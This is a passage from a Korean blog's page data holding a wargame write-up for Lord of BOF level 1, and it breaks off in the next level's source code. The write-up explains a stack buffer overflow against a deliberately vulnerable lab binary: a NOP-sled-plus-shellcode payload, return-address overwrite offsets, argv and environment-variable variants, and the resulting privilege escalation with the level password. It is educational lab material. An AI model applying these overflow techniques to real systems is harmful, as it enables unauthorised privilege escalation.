url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAfCAIAAABoLHqZAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADfElEQVR42o1U246rOBBMMBiwsbk4gDHutk0yZ///D1dtyGjmSDuzKA8RotRdXZcbIHrwbt+dc253ZpoexmitxnGUUvC67pQyj0ff94yx25fnfr/fnh8f6zI/5hkAYkoIXgip+14pdf7Rve462SlF+IJ9Ax+vVwgIiMaYdKTNrlLKsixb0aYjaa0mY/7589F1UkpJgK/gmBIAYAjjOGFEa+1jnm+3W8W52939ftN9fxzJbluM2LbNN3CIEcAD4mQmQLDWzguBGWMYQs0rpTQirpv1fk8paq3uRVEU98/J3gOaxyOmaO26uY1XFWPM7a4o7krrlKKnj9y8LMsyD+MoRUvT03EgQohxMibEuK6r955zzhgLMUgplFKv1zPEiAhKqa6Tfa+LoiAwTUZae5wmQOK8e19VVVEUHrAsme77EMNq7b5vTVM3bdsKce59w5guztOEIWTwXuW1QwxCCNl1KUUhRNu2ZVVxzs+xBE7HAeARw2QMcd7sDp5zmowx1nV9cnb77r0TQgzDwDl/g59P4pyIc4wEBkReVWVVQQhFUei+pw8Ceu903/daf9WZDkY609q4rOvmXFWVrCyd9+e1EcH5PQQUQnLO7+/nU2cYpzFE4gwANLksEaHmXAj5fD2V6pTWSqlvJiHO6LNUU8xSOedOqRCx5rxT+ngeZn6M0zgM47rMutfzPEspLp1jSpfO1n7qjCEI0SqtX6+n1po0klL3NP/U8lo7xGiMAYBlXXfv+VtnzqvPaztnm6ZRFK+3SUJKHjxmcExx2zYPGcwYADDGOqUy2HvwwzDMD6O1NsYI0V5re/DjOJJU1oYYKjoYSylKKWntj5eUsmkaxliRH8boR/ZEhN0TONswezs77JPz8TxOb/cDdcMwjlerEGf0GTxknRe72dODgNg0tew6D35eli2/r+u6bupL55iyPUOYpjElCr1/29MDDENP2c6rlmX5d4el4/mWasqcN0Tg/Mpz9R3wN/i0ZyRvkz2zt+HknOP1IxhD9LAj4jiOGHJu35Hc4Tfwac9cgOMZyc9r5xV+A5+cDdkz2G0LAU+wp0r5hTM1CeWZaghWu55Ur4P9DA6ROOfSn84ycPt+TSaf/rw2NQkF45Grd7XUJHVO1f8AHwcGSAfpHN41lK9dIpH/WaoYl2VerXVuO460LMu6bcsyF0Uhpbyi9x/gfwHzpHHwsWoQHAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f99e8607895cb4a03cdb7883735b2b1b/c9b55/1.webp 165w,\n/static/f99e8607895cb4a03cdb7883735b2b1b/f2908/1.webp 330w,\n/static/f99e8607895cb4a03cdb7883735b2b1b/866c5/1.webp 430w\"\n              sizes=\"(max-width: 430px) 100vw, 430px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f99e8607895cb4a03cdb7883735b2b1b/04c57/1.png 165w,\n/static/f99e8607895cb4a03cdb7883735b2b1b/d9ecf/1.png 330w,\n/static/f99e8607895cb4a03cdb7883735b2b1b/05ed2/1.png 430w\"\n            sizes=\"(max-width: 430px) 100vw, 430px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f99e8607895cb4a03cdb7883735b2b1b/05ed2/1.png\"\n            alt=\"gdb disas main\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>buffer에 값을 넣는 strcpy 이후인 main+59에 breadpoint를 걸어준 후, 임의의 입력값을 넣어 buffer의 시작 주소를 파악한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 572px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35.151515151515156%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABF0lEQVR42oWO25KDIBBExzCAcjGiQgZEwJhk//8Pt8x+wJ6Hrn7oU9Vwvt9biiEEijTPzjlnrLl9gX/ZcnZumueZiKy1D6LwCMu6eL8qNWithRB/KaUchqHvB2MMIl7y5JwxxlqjtL7KaLXW1lqtFRecC4GIUsrbjTHGhBAMGee867pLLq2lLfngJzeFEMb7qJTq+172kl82Xruuwy9/DmMMERlj8DzP53lsOQOAD7619qAIAON4L7XWWqQUiHwve6nFGAMAOee878uywOvzef989n0HgBDC+TpjSgBwn1z5IqVEzltrx3FYa6+ztZbWvF9hr7WUQkQAMM9zznn1HgCMtRQjReKcM8SYYkpJKQUAFIlidNP0C4RiFwFM14DqAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/8d9a42a89fdeed3e5442059a0b922b16/c9b55/2.webp 165w,\n/static/8d9a42a89fdeed3e5442059a0b922b16/f2908/2.webp 330w,\n/static/8d9a42a89fdeed3e5442059a0b922b16/a64e8/2.webp 572w\"\n              sizes=\"(max-width: 572px) 100vw, 572px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/8d9a42a89fdeed3e5442059a0b922b16/04c57/2.png 165w,\n/static/8d9a42a89fdeed3e5442059a0b922b16/d9ecf/2.png 330w,\n/static/8d9a42a89fdeed3e5442059a0b922b16/a805e/2.png 572w\"\n            sizes=\"(max-width: 572px) 100vw, 572px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/8d9a42a89fdeed3e5442059a0b922b16/a805e/2.png\"\n            alt=\"buffer addr\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>buffer의 시작 주소가 0xbfff948임을 알 수 있다.\r\ngdb에서 나와 원본 gremlin 파일로 BOF를 발생시킨다. buffer와 SFP가 총 260bytes이므로 nop로 200bytes, 쉘코드로 25bytes, 나머지 35bytes를 nop로 채운다. 그리고 return address에 buffer에서 쉘코드가 위치하기 전의 nop slide의 아무 지점의 주소를 넣어준다. 여기에서는 0xbfff950을 little endian을 감안해 삽입하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.454545454545457%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABAElEQVR42nWIy26CQAAASTABdpflUd2lSUUt5SJN8WAaeWV57ALtRcUYwGja//+KRu+dTOYwkuM4hJDpA0qpaZqU0PuZTQkhAADTNHWMLduyLEsDwDAM27YhRL7vS1XN84KxgolGsJzlRc5rXgkuGlGURZqlSZamWRrFUZREcRLv4l2URNvPbfvVSN35NIxDfxn6Sz9ex9vv7fZz9/po+91mLCt5eegO++O+ErwSFa85K/LudJQ+NmG4CYP3YB2sX73VZCJL/0MocReuu3CdZyfchJL35i1XS0qp/WRPZzOMdU1TIUIQQl3XEUIQQWwYCCGMsaIoqqoCAGRZfpnP/wCkzi4aERoKyQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/aade2fea6a62134a4b8b8a774acb6ffd/c9b55/3.webp 165w,\n/static/aade2fea6a62134a4b8b8a774acb6ffd/f2908/3.webp 330w,\n/static/aade2fea6a62134a4b8b8a774acb6ffd/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/aade2fea6a62134a4b8b8a774acb6ffd/04c57/3.png 165w,\n/static/aade2fea6a62134a4b8b8a774acb6ffd/d9ecf/3.png 330w,\n/static/aade2fea6a62134a4b8b8a774acb6ffd/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/aade2fea6a62134a4b8b8a774acb6ffd/32056/3.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>쉘을 획득한 모습을 확인할 수 있고, euid가 gremlin인 것을 확인하여 권한을 성공적으로 상승시켰음을 볼 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 145px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.10344827586207%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABFElEQVR42n3NXU+DMBSA4XMKbA4KLftmrPS0gAtsc8Y4hISLqVH//z9apolmXuy9f/KCiMI4lsvlcjafG6MdxsR4IkXIwzDkXAgRSxHH8Ww6vRsO4V9t1/V913YvTdsc9hWg89S/frx1ap1onb1/ffZd07TN6dQvFnMAQMQrj4iMMW8wQGSu6wKAiCdShgHn3B/BjR4Oj/vtZlPtju0RAOvtjvuj2SI5Ns+22pJOEYB99/O8OnPfl1JGkYiiCBEd53J2Xc8P/CAIhIhunW1REKlE6bVKdZYiYr2rc5NRfl+WxvG8qq7IEFljLWVkbVn+4bworNGp0kRaqwum3OaWlKbJWABziyLPskwbWq0SIrtW6hefAYVsHTlGvo3UAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/88be9b8de754c5e0462a6d587e613061/aa41e/4.webp 145w\"\n              sizes=\"(max-width: 145px) 100vw, 145px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/88be9b8de754c5e0462a6d587e613061/0af15/4.png 145w\"\n            sizes=\"(max-width: 145px) 100vw, 145px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/88be9b8de754c5e0462a6d587e613061/0af15/4.png\"\n            alt=\"mypass\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: hello bof world</p>\n<ul>\n<li>또 다른 방법 1: 인자를 활용한다.</li>\n</ul>\n<p>이는 프로그램이 인자의 개수를 검사하지 않기 때문에 가능하다. argv는 프로그램 시작과 동시에 가져오므로, gdb에서 main+3부분에 breakpoint를 걸고 python을 이용해 buffer, return address, argv[2]를 확인하기 위한 인자들을 입력한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.848484848484848%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAyElEQVR42j2P6W7EIBCDCUcSjkCAcsywYWn3/d+x3dLGP6xPo5Flk6/Xq9ZSAUIMzrnTn+u6MsaEEIJzSinnjFLK/kUZW5aFELJtGxmfI6UPQMCGKafn6DmnXHIp5eqXtRYBrLWnP1NKMYZccghRG33Yg1jn9n03xkgprT2kkowxzvmMX96iE26n9H2RUpJ2PQCq98F7H2PQWiutpJLit/z9ffNc9Fe7j3H1HmMQQgAiNlRKEUJKKdjQGD0ZEPTkWtujKaV+Ir4BnkEOBzGmYjEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/2ae620ace2c610aa9b3472a78abf68e7/c9b55/5.webp 165w,\n/static/2ae620ace2c610aa9b3472a78abf68e7/f2908/5.webp 330w,\n/static/2ae620ace2c610aa9b3472a78abf68e7/ff4b8/5.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/2ae620ace2c610aa9b3472a78abf68e7/04c57/5.png 165w,\n/static/2ae620ace2c610aa9b3472a78abf68e7/d9ecf/5.png 330w,\n/static/2ae620ace2c610aa9b3472a78abf68e7/32056/5.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/2ae620ace2c610aa9b3472a78abf68e7/32056/5.png\"\n            alt=\"argv2 addr\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>(중략)</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 599px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 69.6969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACGUlEQVR42l3SyXKcMBQF0NdtRLcDiElofBpB3Y4r2E7+/+MSQXkTVndD6Z4rwcfX5+ef34/ng1K65fz59bXve9/3iHbfP/Z954LPM3t/f98/dusspV3O+de+55xBG4PWzvMEAMM4cs7P3PxoFs6F4ISQl6pijEkpm6YBgHEapZTDMEBMMaQopQCAhXO0VhyZUorWIpq6ritCDKJ1jlIKAEIK6xxbFsiPnJ9viAYApJIhRGN0aTEMPoQQ/O12I6R23qUUy2kASuuUEhcCfPAhRSE4ALCFaWM4L7nrOm2M1uo8WSmFiF3XlYLLYizObAZ0tnRgDACmaRJSsqXkpmmElEpKQkhVVZxzrVXbtgAwz7NSapxGiGuKa9JaAQAXBSOVPM3WOWvx9m123lHaH2bpvFuK+fl4/nxDW8xKqRjj6R+GIcQY42Gua+d9WtNp1kandRVCgAs+pnSuzdhpXgCg7TpljDnN1f9mxMNsnbWlw2GeZ6X1OVjTtlKXr66LWcrz5/bcFS2Wmda8pW0rHY4LTOtqLRZz38dUvvv9XhHivF/XdRzHUlvrtCalFORn3h6PkgCklFvefHAA0PfDuq1b3u6vrxUhIYb8yNM0HWaz5ayNLrXRuQIoVzUbg+faTdtqYwxiXdcvL5VU6njY9Lu2LWv74Eti7Hq5Msasc0rJ6/VCO2rL88T7/ZXUNSJaa2lPL5fLsjBjzD/zX9DiQ4q/x6WbAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/a3596f6da1de19a3126babc2090fb6be/c9b55/6.webp 165w,\n/static/a3596f6da1de19a3126babc2090fb6be/f2908/6.webp 330w,\n/static/a3596f6da1de19a3126babc2090fb6be/6407c/6.webp 599w\"\n              sizes=\"(max-width: 599px) 100vw, 599px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/a3596f6da1de19a3126babc2090fb6be/04c57/6.png 165w,\n/static/a3596f6da1de19a3126babc2090fb6be/d9ecf/6.png 330w,\n/static/a3596f6da1de19a3126babc2090fb6be/43142/6.png 599w\"\n            sizes=\"(max-width: 599px) 100vw, 599px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/a3596f6da1de19a3126babc2090fb6be/43142/6.png\"\n            alt=\"argv2 addr2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>A(\\x41)이 들어간 곳이 buffer + SFP, B(\\x42)가 들어간 곳이 return address의 자리, 그리고 C(\\x43)가 들어간 곳으로 argv[2]의 시작 주소가 0xbffffc06임을 알 수 있다. 이제 이를 통해 exploit을 진행한다. argv[1]에는 쓰레기 값으로 260bytes를 채우고 return address 자리에 argv[2]의 어떤 부분을 주소로 입력한다. 그리고 argv[2]는 앞부분을 어느정도 nop으로 채워준 후 쉘코드를 로드한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.272727272727277%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA9ElEQVR42j2MbWuDMBSFA8YU/aKB5F6N1ehAV6jadaibi9FCK3v5/z9o1LEeHg4P58MhAJAkCeccEACkBMAIOedSSqViIUWs4iiOETEIgpBzIYUQIgjDsixJ8VQ8yPNc53maZWmWZlpnWuv7ovOiUIkSUsr7uwSAkPPnw4E0p7Zpm79uX07TbO1ltovdmKfZmsmM5sPYab4sdrHGmmm2b+P718836Ye+H7qu77qh64f+ul7Xz/W23m6b2MXWTV1V1bE+jmY8v55VovbpHhDruiaIKITwPI8x5vv+brejLmX/cV1GKd3EZYw5lDqOw1xGCMEIfwHZPydIv3ZuLQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/906b1d769bf3ff5524ca426dcad8d8df/c9b55/7.webp 165w,\n/static/906b1d769bf3ff5524ca426dcad8d8df/f2908/7.webp 330w,\n/static/906b1d769bf3ff5524ca426dcad8d8df/ff4b8/7.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/906b1d769bf3ff5524ca426dcad8d8df/04c57/7.png 165w,\n/static/906b1d769bf3ff5524ca426dcad8d8df/d9ecf/7.png 330w,\n/static/906b1d769bf3ff5524ca426dcad8d8df/32056/7.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/906b1d769bf3ff5524ca426dcad8d8df/32056/7.png\"\n            alt=\"exploit2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>권한상승에 성공하였음을 볼 수 있다.</p>\n<ul>\n<li>또 다른 방법 2: 환경변수 활용</li>\n</ul>\n<p>환경변수에 shellcode를 적재하고 return address에 이 환경변수의 주소지를 떨어뜨려 실행시키는 풀이도 가능하다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 14.545454545454545%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAbklEQVR42oWKwQ4EERAFaS6ikWFoWof9/6/cmGT3OnWoVF6eWmuJiExuRLVW5tE7jcfMQ0TuUohaH53oLK3Wct/zMNTaa3/2nJxzztflvY8xppQCogGjtQYDAHDi5xMntXLOIWIImB6stf+feuMLkFkI3caleW8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/43a8160f202a1ec2d99506838af16892/c9b55/8.webp 165w,\n/static/43a8160f202a1ec2d99506838af16892/f2908/8.webp 330w,\n/static/43a8160f202a1ec2d99506838af16892/ff4b8/8.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/43a8160f202a1ec2d99506838af16892/04c57/8.png 165w,\n/static/43a8160f202a1ec2d99506838af16892/d9ecf/8.png 330w,\n/static/43a8160f202a1ec2d99506838af16892/32056/8.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/43a8160f202a1ec2d99506838af16892/32056/8.png\"\n            alt=\"exploit3\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>shellcode를 환경변수에 적재시킨 모습이다. 이후 환경변수 shellcode가 어느 주소에 위치하는지 확인하는 코드를 작성하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 365px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.272727272727277%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAl0lEQVR42pXPSQ7CMAwFUIckbTxnaDeocCTufxxUhWGHxFt9WbL8Da13M6u1IiIzj313UxEGCAAQ3mb+TGAiJiQyM8SSc4a/iAoxu/sYfWybqJrZNrq5E1FBtLOIqGprbWav1VRel2YLdztu9+O49tFHb8yyLLlgUT0XSllVjQiJSVTLuqaUYHksUCFAiPGSTymm+P3qpycZzwhfttjKHgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/9a5bfdfbc4c7e43d0995841019e45b77/c9b55/9.webp 165w,\n/static/9a5bfdfbc4c7e43d0995841019e45b77/f2908/9.webp 330w,\n/static/9a5bfdfbc4c7e43d0995841019e45b77/25243/9.webp 365w\"\n              sizes=\"(max-width: 365px) 100vw, 365px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/9a5bfdfbc4c7e43d0995841019e45b77/04c57/9.png 165w,\n/static/9a5bfdfbc4c7e43d0995841019e45b77/d9ecf/9.png 330w,\n/static/9a5bfdfbc4c7e43d0995841019e45b77/2e8d1/9.png 365w\"\n            sizes=\"(max-width: 365px) 100vw, 365px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/9a5bfdfbc4c7e43d0995841019e45b77/2e8d1/9.png\"\n            alt=\"envaddr.c\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 380px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.60606060606061%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAtElEQVR42lWLy5KDIBAACQYEGWCUx6AjPpLK///iVvaWPvWhW1BtnY9zP4morW1thPPMvFWivOSMaRy1A0DEXCr4r6Sy5Foma0U6cnnV+iZEXDdm5kI1LXNIYblSWEEMQikN3jvntNZSPrVC+RiEEAKPeXml8ikO3Ma8906NMMZIMd4BLwwpbHvnnUPw1hoplTFNSvWdeeP7et/nffTuQ7DGjKPxHiY7DfI5agMADrxS//UvfwV7DoqLGWiCAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/4153e1e98c44ff7464513d7fa805add0/c9b55/10.webp 165w,\n/static/4153e1e98c44ff7464513d7fa805add0/f2908/10.webp 330w,\n/static/4153e1e98c44ff7464513d7fa805add0/1cdb2/10.webp 380w\"\n              sizes=\"(max-width: 380px) 100vw, 380px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/4153e1e98c44ff7464513d7fa805add0/04c57/10.png 165w,\n/static/4153e1e98c44ff7464513d7fa805add0/d9ecf/10.png 330w,\n/static/4153e1e98c44ff7464513d7fa805add0/3f520/10.png 380w\"\n            sizes=\"(max-width: 380px) 100vw, 380px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/4153e1e98c44ff7464513d7fa805add0/3f520/10.png\"\n            alt=\"envaddr\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>환경변수 shellcode가 위치한 주소를 알아냈다. 이를 이용하여 공격을 진행하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 19.393939393939394%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAf0lEQVR42pXKUQ6DMAwD0KZ0kDp2y/hAo/c/6NQhDrD3kViWkyRqiiAAd+97922T5NMWEe5VElDXdZ3T1oIc40oSy6uY5eWRcy6l3PdunjfLZZlLM2utpc91jTH2vQMgGUBFDTICaqq1xgSJJN2dvxCB8zxT7/043gDMLP2D5BcKKwdgDJMmnwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/66e993962389b3ba35e3a8a925524eab/c9b55/11.webp 165w,\n/static/66e993962389b3ba35e3a8a925524eab/f2908/11.webp 330w,\n/static/66e993962389b3ba35e3a8a925524eab/ff4b8/11.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/66e993962389b3ba35e3a8a925524eab/04c57/11.png 165w,\n/static/66e993962389b3ba35e3a8a925524eab/d9ecf/11.png 330w,\n/static/66e993962389b3ba35e3a8a925524eab/32056/11.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/66e993962389b3ba35e3a8a925524eab/32056/11.png\"\n            alt=\"exploit4\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"05e84bad-49dd-5a4e-88cc-6b409b36eaea","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-01/","title":"LOB 1번 (gate -> gremlin)","readingTime":{"text":"4 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/c4e93c828ba48a65e888ab36393de1fd/8512a/0.png","srcSet":"/static/c4e93c828ba48a65e888ab36393de1fd/a72a4/0.png 108w,\n/static/c4e93c828ba48a65e888ab36393de1fd/a6679/0.png 216w,\n/static/c4e93c828ba48a65e888ab36393de1fd/8512a/0.png 432w","sizes":"(min-width: 432px) 432px, 100vw"},"sources":[{"srcSet":"/static/c4e93c828ba48a65e888ab36393de1fd/c914c/0.webp 108w,\n/static/c4e93c828ba48a65e888ab36393de1fd/a0779/0.webp 216w,\n/static/c4e93c828ba48a65e888ab36393de1fd/dd357/0.webp 432w","type":"image/webp","sizes":"(min-width: 432px) 432px, 100vw"}]},"width":660,"height":400.27777777777777}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - cobolt\r\n        - small buffer\r\n*/</span>\r\n\r\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n    <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argv error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span 